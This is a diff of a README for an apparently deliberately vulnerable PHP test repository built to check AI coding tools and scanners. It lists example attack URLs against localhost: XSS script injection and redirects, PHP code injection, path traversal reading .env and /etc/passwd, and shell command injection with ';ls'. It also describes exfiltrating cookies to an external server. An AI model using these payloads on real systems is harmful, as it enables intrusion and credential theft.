@@ -5,11 +5,11 @@ This repository contains intentionally vulnerable code designed to test AI-power
 
 ## Purpose
 - Test AI-powered IDE tools' ability to detect security vulnerabilities against PHP codebase. You can prompt the Agent to `What are the vulnerabilities in my code`.
-- Evaluate security scanners' effectiveness in identifying common security issues
-- Provide a controlled environment for security testing
-- Serve as a reference for understanding common security vulnerabilities
-- Continuously expand with new vulnerabilities and security test cases over time
-- Demonstrate how sensitive environment variables can be exposed through `.env` files in version control (intentionally included to test security scanners)
+- Evaluate security scanners' effectiveness in identifying common security issues.
+- Provide a controlled environment for security testing.
+- Serve as a reference for understanding common security vulnerabilities.
+- Continuously expand with new vulnerabilities and security test cases over time.
+- Demonstrate how sensitive environment variables such as in `.env` files can be exposed.
 
 ## Author
 Created by Weng Fei Fung
@@ -30,6 +30,7 @@ Run on a php server locally. This has been tested on PHP version 8.3.12. You can
 - http://localhost:8888/hacks/echo/?name=%3Cscript%3Ealert(%22You%27re%20hacked%20by%20Weng%20Hackers%20Group!%22);%3C/script%3E
     - Cross-site scripting (XSS)
     - Here exploited to inject into URL's that users share with others a scary message. It's usually to ruin the reputation of a website or to boast that they're hacked by you.
+    ![](README-assets/sqlinjection-victim.png)
     - Classification: 
         - CAPEC	19
         - CWE	79
@@ -50,41 +51,55 @@ Run on a php server locally. This has been tested on PHP version 8.3.12. You can
     })
     ```
 - http://localhost:8888/hacks/echo/?name=hi4;%3Cscript%3Ewindow.location.href=%22https://domain.com%22%3C/script%3E
-    - Cross-site scripting (XSS)
+    - Cross-site scripting (XSS) with Phishing
     - Here when URL is shared, redirects user to hacker's website. Note the hacker could take things further by making the website look similar to the website the url normally opens to, and then tricks the user to logging in, which can easily store the user credentials since the page is on the hacker's server.
+- http://localhost:8888/hacks/sql/
+    - SQL Injection (SQLi)
+    - Here exploited by storing javascript that renders on a comments page. It's usually to ruin the reputation of a website or to boast that they're hacked by you. A hacker can take it further by having the javascript send cookies information about the logged in user to an external server in order to gain their credentials, simply done with fetch and enabling CORS on the hacker's private server.
+    ![](README-assets/sqlinjection-hacker.png)
+    ![](README-assets/sqlinjection-table.png)
+    - Classification: 
+        - CAPEC	66
+        - CWE	89
+        - WASC	19
+        - OWASP 2021	A3
 - http://localhost:8888/hacks/commands-php/?user-role=admin;phpinfo();
     - Remote Code Execution (RCE)
     - Here exploited to reveal PHP information that can be used for further attacks.
-    - CAPEC	23
-    - CWE	95
-    - OWASP 2021	A3
+    - Classification: 
+        - CAPEC	23
+        - CWE	95
+        - OWASP 2021	A3
 - http://localhost:8888/hacks/open-file/?filepath=../.env
     - Local file inclusion (LFI)
     - Here gained access to .env file for API keys
-    - CAPEC	252
-    - CWE	98
-    - WASC	33
-    - OWASP 2021	A1
+    - Classification: 
+        - CAPEC	252
+        - CWE	98
+        - WASC	33
+        - OWASP 2021 A1
 - http://localhost:8888/hacks/open-file/?filepath=%2e.%2f.env
     - Local file inclusion (LFI)
     - Here worked around naive regex security against LFI's `../`
 - http://localhost:8888/hacks/open-file/?filepath=../etc/passwd
     - Directory traversal attack (DTA)
     - Here hacker would've broke out of the web document root folder with more `../`'s and accessed the credentials
-    - CAPEC	126
-    - CWE	23
-    - WASC	33
-    - OWASP 2021	A1
+    - Classification: 
+        - CAPEC	126
+        - CWE	23
+        - WASC	33
+        - OWASP 2021	A1
 - http://localhost:8888/hacks/commands-shell/grep.php?search=at
     - Baseline use (Not hacked). But will be used to OS command injection
 - http://localhost:8888/hacks/commands-shell/grep.php?search=at%20;ls%20.;
     - OS command injection
     - Here gained access to directory still within the web document root folder
     - Injected between grep command and a grep option.
-    - CAPEC	88
-    - CWE	78
-    - WASC	31
-    - OWASP 2021	A3
+    - Classification: 
+        - CAPEC	88
+        - CWE	78
+        - WASC	31
+        - OWASP 2021	A3
 - http://localhost:8888/hacks/commands-shell/find.php?search=at;ls%20.;
     - OS command injection
     - Here gained access to directory still within the web document root folder
